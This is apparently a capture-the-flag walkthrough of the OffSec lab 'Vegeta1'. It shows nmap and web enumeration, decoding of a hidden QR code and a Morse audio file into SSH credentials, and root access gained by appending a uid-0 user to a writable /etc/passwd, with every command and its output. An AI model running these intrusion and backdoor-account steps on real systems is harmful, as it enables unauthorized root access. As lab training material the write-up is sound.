# Vegeta1

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Difficulty: Easy
Community Rating: Intermediate
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
OS: Linux
Points: 5
Lab Description:
In this lab, you will uncover SSH credentials encoded in Morse code hidden inside an audio file. 
Privilege escalation is achieved by exploiting writable file permissions on /etc/passwd, 
allowing the creation of a root-equivalent user.
Released: 25 Aug 2020
```

Machine link: [https://portal.offsec.com/machine/vegeta1-314/overview/details](https://portal.offsec.com/machine/vegeta1-314/overview/details)

## Solution

### Scan for services with nmap

We start by scanning the machine with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Vegeta1]
└─$ export TARGET_IP=192.168.107.73                    

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Vegeta1]
└─$ sudo nmap -sC -sV $TARGET_IP 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-18 15:10 CET
Nmap scan report for 192.168.107.73
Host is up (0.033s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1f:31:30:67:3f:08:30:2e:6d:ae:e3:20:9e:bd:6b:ba (RSA)
|   256 7d:88:55:a8:6f:56:c8:05:a4:73:82:dc:d8:db:47:59 (ECDSA)
|_  256 cc:de:de:4e:84:a8:91:f5:1a:d6:d2:a6:2e:9e:1c:e0 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.07 seconds
```

We have two services running:

- OpenSSH 7.9p1 on port 22
- Apache httpd 2.4.38 on port 80

### Analyse the web site

Browsing manually to port 80 we find a single image

![Web Site on Vegeta1](Images/Web_Site_on_Vegeta1.png)

Nothing of interest is found in the HTML source.

Let's also do some basic enumeration with nmap

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Vegeta1]
└─$ nmap -v -p80 --script "http-enum*" $TARGET_IP    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-18 15:17 CET
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:17
Completed NSE at 15:17, 0.00s elapsed
Initiating Ping Scan at 15:17
Scanning 192.168.107.73 [4 ports]
Completed Ping Scan at 15:17, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:17
Completed Parallel DNS resolution of 1 host. at 15:17, 0.07s elapsed
Initiating SYN Stealth Scan at 15:17
Scanning 192.168.107.73 [1 port]
Discovered open port 80/tcp on 192.168.107.73
Completed SYN Stealth Scan at 15:17, 0.06s elapsed (1 total ports)
NSE: Script scanning 192.168.107.73.
Initiating NSE at 15:17
Completed NSE at 15:17, 3.19s elapsed
Nmap scan report for 192.168.107.73
Host is up (0.031s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/admin.php: Possible admin folder
|   /login.php: Possible admin folder
|   /robots.txt: Robots file
|   /image/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|_  /manual/: Potentially interesting folder

NSE: Script Post-scanning.
Initiating NSE at 15:17
Completed NSE at 15:17, 0.00s elapsed
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.61 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)
```

Let's check the contents of the [robots.txt](https://en.wikipedia.org/wiki/Robots.txt) file

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Vegeta1]
└─$ curl http://$TARGET_IP/robots.txt
*
/find_me
```

Checking this directory, we find a `find_me.html` file that contains base64-encoded text at the end

```html
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Vegeta1]
└─$ cat find_me.html | grep -v '^$'  
<html>
<head> Vegeta-1.0 </head>
<body></body>
</html>
<!-- aVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQU1nQUFBRElDQVlBQUFDdFdLNmVBQUFIaGtsRVFWUjRuTzJad1k0c09RZ0U1LzkvK3UyMU5TdTdCd3JTaVN0QzhoR2M0SXBMOTg4L0FGanljem9BZ0RNSUFyQUJRUUEySUFqQUJnUUIySUFnQUJzUUJHQURnZ0JzUUJDQURRZ0NzQUZCQURhRUJmbjUrUmwvbk9aTFAxeER6K3g5VTA1cWJoWjFkcjRzSFQyejkwMDVxYmxaMU5uNXNuVDB6TjQzNWFUbVpsRm41OHZTMFRONzM1U1RtcHRGblowdlMwZlA3SDFUVG1wdUZuVjJ2aXdkUGJQM1RUbXB1Vm5VMmZteWRQVE0zamZscE9hdVhKUVRUamxkSHZ0YmxvNDZOUWp5UjV4eUlvZ09CUGtqVGprUlJBZUMvQkdubkFpaUEwSCtpRk5PQk5HQklIL0VLU2VDNkVDUVArS1VFMEYwakJWRS9aSGM4SEhkUHZ1RWQwZVF3N003MWFtelRIaDNCRGs4dTFPZE9zdUVkMGVRdzdNNzFhbXpUSGgzQkRrOHUxT2RPc3VFZDBlUXc3TTcxYW16VEhoM0JEazh1MU9kT3N1RWQwZVFJcWJNNENUcmhKMGhTQkZUWmtDUUdBaFN4SlFaRUNRR2doUXhaUVlFaVlFZ1JVeVpBVUZpSUVnUlUyWkFrQmdJVXNTVUdSQWtCb0lVMFRHZjAxN2UrdTRJVXNScEtSRGtXYzVsdjNEQlN4ZjFqZE5TSU1pem5NdCs0WUtYTHVvYnA2VkFrR2M1bC8zQ0JTOWQxRGRPUzRFZ3ozSXUrNFVMWHJxb2I1eVdBa0dlNVZ6MkN4ZThkRkhmT0MwRmdqekx1ZXdYTGhCL2VGazZjcm84Mm9rc2IzMTNCQkgwdkNITFc5OGRRUVE5YjhqeTFuZEhFRUhQRzdLODlkMFJSTkR6aGl4dmZYY0VFZlM4SWN0YjN4MUJCRDF2eVBMV2R5OFZaTXJwV1BDYjY2YWNEQWdTbUkrNjJTY0RnZ1RtbzI3MnlZQWdnZm1vbTMweUlFaGdQdXBtbnd3SUVwaVB1dGtuQTRJRTVxTnU5c25nOVNPMkFjcmxQN212SXd2OEg3YjVDd1NCVDlqbUx4QUVQbUdidjBBUStJUnQvZ0pCNEJPMitRc0VnVS9ZNWk4UUJENlIvUS9pMURPTFU4OHBkV3FxY3lKSTBlenFubFBxMUNBSWdveXFVNE1nQ0RLcVRnMkNJTWlvT2pVSWdpQ2o2dFFnQ0lLTXFsTnpYQkExYnhZeWk5TU1UbStVeWwvZXNSZ0VpZU0wZzlNYnBmS1hkeXdHUWVJNHplRDBScW44NVIyTFFaQTRUak00dlZFcWYzbkhZaEFranRNTVRtK1V5bC9lc1JnRWllTTBnOU1icGZLWGR5d0dRZUk0emVEMFJxbjhwYzJTUTcxWkFxZlpwd2pTVWJmc2w2cEtoRU1RajV3SUVzeWZxa3FFUXhDUG5BZ1N6SitxU29SREVJK2NDQkxNbjZwS2hFTVFqNXdJRXN5ZnFrcUVReENQbkFnU3pKK3FTb1JERUkrY0NCTE1uNm9xRHVleWpLNmVhcHdFNmNpWjdabkttS29xRHVleWpLNmVhaEFFUVI3VnFYdXFRUkFFZVZTbjdxa0dRUkRrVVoyNnB4b0VRWkJIZGVxZWFoQUVRUjdWcVh1cVFaQ0JncWcvNWpmZjEvRngzUzdXOHE2cHdia1BRUkNFK3hDa01HZnFycW5CdVE5QkVJVDdFS1F3WitxdXFjRzVEMEVRaFBzUXBEQm42cTdLY0ZtY0hzYnBvM1RLMlpGbEFnaHlPQXVDZUlNZ2g3TWdpRGNJY2pnTGduaURJSWV6SUlnM0NISTRDNEo0Z3lDSHN5Q0lONldDM1A0d1RvL3RKTEo2TDhvc0NGSjBueG9FUVpDMkxCMzNxVUVRQkduTDBuR2ZHZ1JCa0xZc0hmZXBRUkFFYWN2U2NaOGFCRUdRdGl3ZDk2bEJrSUdDZE5TcGUyYnZVMzk0Nm5mb3lPazAzN0pmdU1Ba2VGZlA3SDFPSDE3MlBuVk9wL21XL2NJRkpzRzdlbWJ2Yy9yd3N2ZXBjenJOdCt3WExqQUozdFV6ZTUvVGg1ZTlUNTNUYWI1bHYzQ0JTZkN1bnRuN25ENjg3SDNxbkU3ekxmdUZDMHlDZC9YTTN1ZjA0V1h2VStkMG1tL1pMMXhnRXJ5clovWStwdzh2ZTU4NnA5Tjh5MzdoQXZHSGZzUHlPN0pNMmFkNlp3aGkrbWdkODkyd1R3UzU3RUU3WmtjUUJMbm1RVHRtUnhBRXVlWkJPMlpIRUFTNTVrRTdaa2NRQkxubVFUdG1SNUFYQ1hJNzZnKzJBN1dRSFZrNnhFcmxUMVZkRElKNFpFRVFVeERFSXd1Q21JSWdIbGtReEJRRThjaUNJS1lnaUVjV0JERUZRVHl5akJXa1kyRDFjV0xLQitUeXdYNERRUkFFUVlUM0ljaGhFS1FXQkVFUUJCSGVoeUNIUVpCYUVBUkJFRVI0SDRJY0JrRnFzUmJFaVk2Y04zek1UaCtzK28xUy9VNEg2QUpCRUFSQk5pQUlnaURJQmdSQkVBVFpnQ0FJZ2lBYkVBUkJFR1FEZ2lESUtFRnUrTGc2NW5QSzRuVFV1MTdlRlM0d2VqUjF6bzc1bkxJNEhmV3VsM2VGQzR3ZVRaMnpZejZuTEU1SHZldmxYZUVDbzBkVDUreVl6eW1MMDFIdmVubFh1TURvMGRRNU8rWnp5dUowMUx0ZTNoVXVNSG8wZGM2TytaeXlPQjMxcnBkM2hRdU1IazJkczJNK3B5eE9SNzNyNVYzaEFxTkhVK2QwMnN1VUxOTnpJb2h4M1ExWnB1ZEVFT082RzdKTXo0a2d4blUzWkptZUUwR002MjdJTWowbmdoalgzWkJsZWs0RU1hNjdJY3YwbkFoU3hKUVoxRDJuZkMvTEhKWExjQm9ZUVR4NlR2bGVsamtxbCtFME1JSjQ5Snp5dlN4elZDN0RhV0FFOGVnNTVYdFo1cWhjaHRQQUNPTFJjOHIzc3N4UnVReW5nUkhFbytlVTcyV1pvM0laVGdNamlFZlBLZC9MTWtmbE1weVk4bEVxSC9zSlRoODZnaFNBSUxVZ1NQT2kxQ0JJTFFqU3ZDZzFDRklMZ2pRdlNnMkMxSUlnell0U2d5QzFJRWp6b3RRZ1NDMElVckNvS1NjN245TmVzcHplZmNVTTJmbFMvU29EVERrZEMzYWF3U2tuZ2d3OEhRdDJtc0VwSjRJTVBCMExkcHJCS1NlQ0REd2RDM2Fhd1NrbmdndzhIUXQybXNFcEo0SU1QQjBMZHByQktlZnJCQUY0RXdnQ3NBRkJBRFlnQ01BR0JBSFlnQ0FBR3hBRVlBT0NBR3hBRUlBTkNBS3dBVUVBTmlBSXdBWUVBZGp3SHlVRnd2VnIwS3ZGQUFBQUFFbEZUa1N1UW1DQw== -->
```

The Base64 double-encoded text turns out to be a PNG-file

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Vegeta1]
└─$ tail -n1 find_me.html | base64 -i -d | base64 -d
�PNG
▒
IHDR��X���IDATx�����,�����5+�
�A6������K?\C��}SNjnuv�,=��M9��Y����t���7���fQg����3{ߔ���E��/KG��}SNjnuv�,=��M9��Y����t���7����\�N9]�[��:�G�r"��#N9D����A��SNс �)'��@�?��At�D����q�>��wG�ó;թ�Lxw9<�S�:˄wG�ó;թ�Lxw9<�S�:˄wG�ó;թ�Lxw9<�S�:˄wG�"���$넝!HSf@�RĔ$�1e�� EL�Ab HSf@�RĔ$��1��^��R�i)�Y�e�p�K���R ȳ��~႗.��@�g9���/]�7NK� �r.��
                                                                                        ^��o��A��\�
                                                                                                   �tQ�8-�<˹�.xY:r�<ډ,o}w��!�[�A=o���wGA����D���,o}w��!�[�A=o���w/d��X��릜
                                                                                                                                                                         ����'���n�ɀ ����}2 H`>�f�
                                                                                                                                                                                                 ����'���n����#���?��#
         ���
            �O��/>a��@��m�A���
� Ȩ:� ������Ss\5o2��          �O��/>����3�S�)uj�s"H����S�����S�2�N
                    No��_ޱ▒��4����w,A�8���F����A�8N38�Q*y�b$��
                                                              No��_ޱ▒��4����w,A�8���F���C�Y��Q�엪J�C��J�C��J�C��J�C��J�C��J�C��*粌��j��ș��ʘ�*粌��jAթ{�AyT���A�Q���▒A�Gu��jAթ{�A����?�7���q�.������A���0gꮩ��A���0gꮩ��A���0g���pY����t�r8
                          �x� �� �r8
                                    �x� �� �r8
                                              �x� �� �7����0N��$�z/�Rt�▒A��,��Ai��q�▒A��,��Ai��q�▒A��,��A���tԩ{f�Sx�w���4_��$xW��}N^�>uN�����&��zf�s�����s:ͷ�.0 ��3{�Ӈ��O��i�e�p�I������>��}��N�-��
                                                                                                                                                                                                   L�w������e�S�t�o�/\`��g�>�/{�:��|�~���~��;�L٧zb�h�ݰO��A;fG��A;fG��A;fG��A;fG��A;fG�       r;����Y:�J�OU]
                                                                                              �xdAS�#
                                                                                                     ��� Y��Ȃ � �G1A<���c`�qb����~AA��!�a�Aއ �A�ZADx�Aj�ĉ��7|�N���R�N�AA6� �Aـ� d� �(An��:�s��tԻ^�.0z4uΎ���8���w�
    �M��c>�,NG���]��GS����)��Q�zyW�����9;�s��tԻ^�.0z4uΎ���8���w�
Y��D��Lω �u7d��A��n�2='�▒�ݐezN1��!��RĔ�=�|/���p▒▒A<zN�^�9*��40�x����,sT.�i`��9�{Y��\����s����Q�
                                                                                               ��ģ���e��rN#�G�)��2G�2���Q*�     N:�� � H��� HҼ(R
�Ԃ R� � H��� HR��)';��^���}�                                                                                                                    �4/J
                            ��R�*L9
                                   v��)'�
                                         <
                                          v��)'�
                                                <
                                                 v��)'�
                                                       <
                                                        v��)'�
                                                              <
                                                               v��)'�
                                                                     <
�A6���%��kЫ�IEND�B`�                                                                                                                                                                                                             
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Vegeta1]
└─$ tail -n1 find_me.html | base64 -i -d | base64 -d > picture.png
```

The image is a QR-code that corresponds to a password (`topshellv`) for an unknown user

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Vegeta1]
└─$ zbarimg picture.png 
QR-Code:Password : topshellv
scanned 1 barcode symbols from 1 images in 0.02 seconds
```

The `/admin/admin.php` file is more or less empty

```php
<?php ?>

```

The `image` directory is empty, but the `/img` directory contains one file named `vegeta.jpg`.

### Check for files and folders with gobuster

Let's also check for additional files and folders with gobuster

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Vegeta1]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -t 32 -x php,txt,html -u http://$TARGET_IP
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.107.73
[+] Method:                  GET
[+] Threads:                 32
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 119]
/img                  (Status: 200) [Size: 937]
/login.php            (Status: 200) [Size: 0]
/image                (Status: 200) [Size: 741]
/admin                (Status: 200) [Size: 940]
/manual               (Status: 200) [Size: 626]
/robots.txt           (Status: 200) [Size: 11]
/.html                (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Nothing new!? We try a recursive scan with `ffuf` with a larger dictionary just to be sure.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Vegeta1]
└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://$TARGET_IP/FUZZ -ac -recursion 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.107.73/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 119, Words: 6, Lines: 10, Duration: 38ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 119, Words: 6, Lines: 10, Duration: 38ms]
# directory-list-2.3-big.txt [Status: 200, Size: 119, Words: 6, Lines: 10, Duration: 38ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 119, Words: 6, Lines: 10, Duration: 38ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 119, Words: 6, Lines: 10, Duration: 36ms]
# Copyright 2007 James Fisher [Status: 200, Size: 119, Words: 6, Lines: 10, Duration: 36ms]
#                       [Status: 200, Size: 119, Words: 6, Lines: 10, Duration: 38ms]
#                       [Status: 200, Size: 119, Words: 6, Lines: 10, Duration: 35ms]
#                       [Status: 200, Size: 119, Words: 6, Lines: 10, Duration: 35ms]
#                       [Status: 200, Size: 119, Words: 6, Lines: 10, Duration: 35ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 119, Words: 6, Lines: 10, Duration: 35ms]
# on at least 1 host    [Status: 200, Size: 119, Words: 6, Lines: 10, Duration: 35ms]
                        [Status: 200, Size: 119, Words: 6, Lines: 10, Duration: 36ms]
# Priority-ordered case-sensitive list, where entries were found [Status: 200, Size: 119, Words: 6, Lines: 10, Duration: 37ms]
img                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 38ms]
[INFO] Adding a new job to the queue: http://192.168.107.73/img/FUZZ

image                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 31ms]
[INFO] Adding a new job to the queue: http://192.168.107.73/image/FUZZ

admin                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 30ms]
[INFO] Adding a new job to the queue: http://192.168.107.73/admin/FUZZ

manual                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 30ms]
[INFO] Adding a new job to the queue: http://192.168.107.73/manual/FUZZ

                        [Status: 200, Size: 119, Words: 6, Lines: 10, Duration: 41ms]
bulma                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 43ms]
[INFO] Adding a new job to the queue: http://192.168.107.73/bulma/FUZZ

[INFO] Starting queued job on target: http://192.168.107.73/img/FUZZ

# directory-list-2.3-big.txt [Status: 200, Size: 937, Words: 62, Lines: 17, Duration: 31ms]
# on at least 1 host    [Status: 200, Size: 937, Words: 62, Lines: 17, Duration: 31ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 937, Words: 62, Lines: 17, Duration: 31ms]
#                       [Status: 200, Size: 937, Words: 62, Lines: 17, Duration: 31ms]
<---snip--->
```

In the `bulma` directory we find a WAV-file that we download for analysis

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Vegeta1]
└─$ wget http://192.168.107.73/bulma/hahahaha.wav                                                           
--2026-02-18 16:21:54--  http://192.168.107.73/bulma/hahahaha.wav
Connecting to 192.168.107.73:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 236124 (231K) [audio/x-wav]
Saving to: ‘hahahaha.wav’

hahahaha.wav                                        100%[================================================================================================================>] 230.59K   546KB/s    in 0.4s    

2026-02-18 16:21:55 (546 KB/s) - ‘hahahaha.wav’ saved [236124/236124]


┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Vegeta1]
└─$ file hahahaha.wav 
hahahaha.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 8 bit, mono 8000 Hz
```

Listening to the file we understand that it is [Morse code](https://en.wikipedia.org/wiki/Morse_code).

With [this online service](https://morsecode.world/international/decoder/audio-decoder-adaptive.html) we can decode it to

```text
USER : TRUNKS PASSWORD : US3R(S IN DOLLARS SYMBOL)
```

So we now have the credentials: `trunks:u$3r`

### Login with SSH as trunks

Let's see if we can login with SSH

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Easy/Vegeta1]
└─$ ssh trunks@$TARGET_IP                                                                            
The authenticity of host '192.168.107.73 (192.168.107.73)' can't be established.
ED25519 key fingerprint is SHA256:rsXPQiqA/9/evxX6rCmmUEw19kPNCvB8JB0r8rYuXR4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.107.73' (ED25519) to the list of known hosts.
trunks@192.168.107.73's password: 
Linux Vegeta 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
trunks@Vegeta:~$ 
```

### Get the user flag

Now we can start looking for the user flag

```bash
trunks@Vegeta:~$ ls -la
total 32
drwxr-xr-x 3 trunks trunks 4096 Aug 12  2020 .
drwxr-xr-x 3 root   root   4096 Jun 28  2020 ..
-rw------- 1 trunks trunks  382 Jun 28  2020 .bash_history
-rw-r--r-- 1 trunks trunks  220 Jun 28  2020 .bash_logout
-rw-r--r-- 1 trunks trunks 3526 Jun 28  2020 .bashrc
drwxr-xr-x 3 trunks trunks 4096 Jun 28  2020 .local
-rw-r--r-- 1 trunks trunks   33 Feb 18 19:39 local.txt
-rw-r--r-- 1 trunks trunks  807 Jun 28  2020 .profile
trunks@Vegeta:~$ cat local.txt 
c<REDACTED>7
trunks@Vegeta:~$ 
```

Nice, so far so good.

### Enumeration for privesc

Next, we enumerate the system for privilege escalation opportunities.

In the `.bash_history` file, we find another set of possible credentials

```bash
trunks@Vegeta:~$ cat .bash_history 
perl -le ‘print crypt(“Password@973″,”addedsalt”)’
perl -le 'print crypt("Password@973","addedsalt")'
echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd[/sh]
echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
ls
su Tom
ls -la
cat .bash_history 
sudo apt-get install vim
apt-get install vim
su root
cat .bash_history 
exit
```

But the `tom` user doesn't exist

```bash
trunks@Vegeta:~$ cat /etc/passwd | grep -i tom
trunks@Vegeta:~$ 
```

But we do have write permissions to the `/etc/passwd` file

```bash
trunks@Vegeta:~$ ls -l /etc/passwd
-rw-r--r-- 1 trunks root 1486 Jun 28  2020 /etc/passwd
trunks@Vegeta:~$ 
```

So we can add a new root user called `newroot`

```bash
trunks@Vegeta:~$ openssl passwd -6 my_new_password
$6$EwNg5hisB/d9N3K6$aMgxJYOIc5U1qKVFyi.9oSF4x1PZsu2KniSQvga/DsElsF/awn8SXO4o6toUKaazJD/hz1FvQMwQCdlJyiNBD/
trunks@Vegeta:~$ echo 'newroot:$6$EwNg5hisB/d9N3K6$aMgxJYOIc5U1qKVFyi.9oSF4x1PZsu2KniSQvga/DsElsF/awn8SXO4o6toUKaazJD/hz1FvQMwQCdlJyiNBD/:0:0:newroot:/root:/bin/bash' >> /etc/passwd
trunks@Vegeta:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
trunks:x:1000:1000:trunks,,,:/home/trunks:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
newroot:$6$EwNg5hisB/d9N3K6$aMgxJYOIc5U1qKVFyi.9oSF4x1PZsu2KniSQvga/DsElsF/awn8SXO4o6toUKaazJD/hz1FvQMwQCdlJyiNBD/:0:0:newroot:/root:/bin/bash
trunks@Vegeta:~$ 
```

### Switch to the new user

Next, we switch to our new user

```bash
trunks@Vegeta:~$ su newroot
Password: 
root@Vegeta:/home/trunks# id
uid=0(root) gid=0(root) groups=0(root)
root@Vegeta:/home/trunks# 
```

And we have root permissions!

### Get the root flag

Finally we get the root flag

```bash
root@Vegeta:/home/trunks# cd /root
root@Vegeta:~# ls -l
total 8
-rw-r--r-- 1 root root 33 Feb 18 19:39 proof.txt
-rw-r--r-- 1 root root 32 Aug 12  2020 root.txt
root@Vegeta:~# cat proof.txt 
c<REDACTED>f
root@Vegeta:~# 
```

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [base64 - Linux manual page](https://man7.org/linux/man-pages/man1/base64.1.html)
- [Base64 - Wikipedia](https://en.wikipedia.org/wiki/Base64)
- [curl - Homepage](https://curl.se/)
- [curl - Linux manual page](https://man7.org/linux/man-pages/man1/curl.1.html)
- [cURL - Wikipedia](https://en.wikipedia.org/wiki/CURL)
- [Gobuster - GitHub](https://github.com/OJ/gobuster/)
- [Gobuster - Kali Tools](https://www.kali.org/tools/gobuster/)
- [grep - Linux manual page](https://man7.org/linux/man-pages/man1/grep.1.html)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [Morse code - Wikipedia](https://en.wikipedia.org/wiki/Morse_code)
- [Morse Code Adaptive Audio Decoder](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [OpenSSH  - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [openssl - Linux manual page](https://linux.die.net/man/1/openssl)
- [OpenSSL - Wikipedia](https://en.wikipedia.org/wiki/OpenSSL)
- [QR code - Wikipedia](https://en.wikipedia.org/wiki/QR_code)
- [robots.txt - Wikipedia](https://en.wikipedia.org/wiki/Robots.txt)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [su - Linux manual page](https://man7.org/linux/man-pages/man1/su.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [tail - Linux manual page](https://man7.org/linux/man-pages/man1/tail.1.html)
- [WAV - Wikipedia](https://en.wikipedia.org/wiki/WAV)
- [wget - Linux manual page](https://man7.org/linux/man-pages/man1/wget.1.html)
- [zbarimg - Linux manual page](https://linux.die.net/man/1/zbarimg)
